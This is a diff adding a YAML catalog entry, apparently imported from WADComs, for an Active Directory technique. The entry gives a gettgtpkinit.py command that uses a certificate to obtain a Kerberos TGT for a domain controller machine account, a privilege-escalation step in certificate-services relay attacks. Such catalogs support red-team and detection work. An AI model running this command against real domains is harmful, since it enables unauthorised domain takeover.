@@ -1,0 +1,33 @@
+id: wadcoms/pkinit-gettgtpkinit
+type: technique
+platform: active-directory
+name: PKINIT gettgtpkinit
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+- privilege-escalation
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- a valid username
+- a valid password
+- pfx
+commands:
+- template: python3 gettgtpkinit.py test.local/DC01\$ -cert-pfx crt.pfx -pfx-pass password123 out.ccache
+  comment: PKINIT gettgtpkinit.py request a TGT using a PFX file, either as file or as base64 encoded
+    blob, or PEM files for cert+key. This uses Kerberos PKINIT and will output a TGT into the specified
+    ccache. It will also print the AS-REP encryption key which you may need for the getnthash
+references:
+- https://github.com/dirkjanm/PKINITtools
+- https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/
+tags:
+- active-directory
+- wadcoms
+- kerberos
